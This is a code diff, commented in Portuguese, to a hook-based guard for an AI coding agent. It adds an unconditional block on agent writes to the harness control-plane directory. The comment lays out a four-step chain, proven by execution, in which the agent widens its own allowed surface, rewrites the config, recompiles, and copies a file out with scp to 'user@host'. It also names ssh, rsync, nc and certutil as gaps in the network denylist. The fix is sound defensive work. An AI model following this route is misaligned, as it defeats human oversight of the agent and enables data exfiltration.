@@ -602,6 +602,59 @@ def _is_scratch_surface_path(path: str) -> bool:
     return normalized.startswith(SCRATCH_DIR_PREFIX)
 
 
+# ---------------------------------------------------------------------------
+# Floor do plano de controle (Python real, IMPORTÁVEL) — Item 0 do plano v2 da
+# correção do dogfood `Savant.Backend`. Escrita do AGENTE em `.harness/**` é
+# deny INCONDICIONAL, com as duas exceções que já têm regra própria
+# (`.harness/work/**` = autoria do próximo contrato, `.harness/scratch/**` =
+# artefato temporário).
+#
+# Por que virou floor, e não mais uma checagem de superfície: até aqui o único
+# gate sobre `.harness/harness.yaml` era a superfície do contrato ativo — e a
+# superfície é ampliável pelo próprio agente via `harness task add-file`, que
+# não validava path (ver `harness.contract.add_task_file`). Isso fechava uma
+# cadeia de auto-ampliação de superfície de COMANDO, provada por execução
+# contra o guard gerado do HEAD:
+#
+#   1. `harness task add-file T-01 .harness/harness.yaml`  -> allow
+#   2. `Write .harness/harness.yaml`                       -> allow (era deny)
+#   3. `harness compile-session`                           -> allow, re-bakeia
+#   4. `scp <arquivo> user@host:/tmp`                      -> allow (era deny)
+#
+# Quatro tool calls, nenhum toque humano, e o floor de rede não é atravessado
+# em nenhum passo — a exposição é exatamente tudo o que a denylist do floor não
+# enumera (`ssh`, `scp`, `rsync`, `nc`, `docker run`, `certutil -urlcache`).
+#
+# A correção é deliberadamente em DUAS camadas: `add_task_file` recusa o path
+# na entrada, e este floor recusa a escrita mesmo que o path entre na
+# superfície por qualquer outra via (`files[]` legado de um Plans.md já
+# compilado, edição manual do Plans.md, futura rota ainda não escrita). Uma
+# camada só reproduziria o erro que criou o furo: uma peça defensável sozinha
+# governando sozinha o plano de controle.
+#
+# O USUÁRIO continua editando `.harness/harness.yaml` no terminal próprio, fora
+# do Claude Code, onde nenhum hook intercepta — mesma postura do kill-switch.
+# ---------------------------------------------------------------------------
+CONTROL_PLANE_DIR_PREFIX = ".harness/"
+CONTROL_PLANE_WRITABLE_PREFIXES = (WORK_DIR_PREFIX, SCRATCH_DIR_PREFIX)
+
+
+def is_floor_control_plane_path(path: str) -> bool:
+    """True se `path` aponta para o plano de controle do harness
+    (`.harness/**`) FORA das duas áreas com regra própria (`work/`, `scratch/`).
+
+    Normaliza com `posixpath.normpath` antes do prefixo (mesmo anti-traversal
+    de `_is_work_surface_path`) e converte `\\` para `/` DEPOIS da
+    normalização — um path Windows-style (`.harness\\harness.yaml`) precisa
+    casar aqui, senão a barra invertida vira o bypass trivial deste floor."""
+    import posixpath
+
+    normalized = posixpath.normpath(path or "").replace("\\", "/")
+    if not normalized.startswith(CONTROL_PLANE_DIR_PREFIX):
+        return False
+    return not normalized.startswith(CONTROL_PLANE_WRITABLE_PREFIXES)
+
+
 PROGRESS_FILE_NAME = "claude-progress.md"
 
 
@@ -1303,6 +1356,9 @@ def render_boundary_guard(
         f"SCRATCH_DIR_PREFIX = {SCRATCH_DIR_PREFIX!r}",
         inspect.getsource(_is_work_surface_path),
         inspect.getsource(_is_scratch_surface_path),
+        f"CONTROL_PLANE_DIR_PREFIX = {CONTROL_PLANE_DIR_PREFIX!r}",
+        f"CONTROL_PLANE_WRITABLE_PREFIXES = {CONTROL_PLANE_WRITABLE_PREFIXES!r}",
+        inspect.getsource(is_floor_control_plane_path),
         f"PROGRESS_FILE_NAME = {PROGRESS_FILE_NAME!r}",
         inspect.getsource(_is_progress_file_path),
         inspect.getsource(_is_claude_memory_path),
@@ -1811,6 +1867,18 @@ def _evaluate_file(path, cwd):
             "(.harness/harness.disabled) e bloqueio incondicional - o agente nao "
             "pode se auto-desativar; para desativar o harness, rode `harness disable` "
             "no SEU terminal (fora do Claude Code, onde nenhum hook intercepta)"
+        )
+
+    if is_floor_control_plane_path(path):
+        return "deny", (
+            "runtime floor: escrita no plano de controle do harness (.harness/**, "
+            "exceto work/ e scratch/) e bloqueio incondicional - estes arquivos "
+            "DEFINEM a superficie que o guard aplica, entao edita-los seria "
+            "auto-ampliacao de superficie sem gate humano; declara-los em files[] "
+            "de uma tarefa NAO abre excecao. Se a governanca precisa mudar, edite "
+            ".harness/harness.yaml no SEU terminal (fora do Claude Code) e rode "
+            "`harness compile-session`; para o proximo contrato, use "
+            ".harness/work/<slug>/ (sempre gravavel)"
         )
 
     if _is_claude_memory_path(path):
